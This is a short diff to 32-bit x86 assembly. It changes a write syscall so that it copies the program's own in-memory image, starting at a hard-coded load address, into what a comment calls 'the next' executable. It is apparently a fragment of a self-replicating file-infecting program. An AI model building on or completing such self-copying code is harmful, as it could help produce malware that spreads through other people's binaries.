@@ -1,6 +1,9 @@
 BITS 32
 
+; Some value have to be changed
+
 SIZE equ 0xc7
+VIRTUAL_ADDR equ 0x08040000
 
 segment .data
 
@@ -58,9 +61,9 @@ executable:
 ; copy the actual file in the next
 
 copy:
-	mov eax, 0x04       ; syscall 32 bits for write
-	mov ecx, file_name  ; start of file
-    mov edx, SIZE       ; file's size
+	mov eax, 0x04           ; syscall 32 bits for write
+	mov ecx, VIRTUAL_ADDR   ; start of file
+    mov edx, SIZE           ; file's size
 	int 0x80
 
 close:
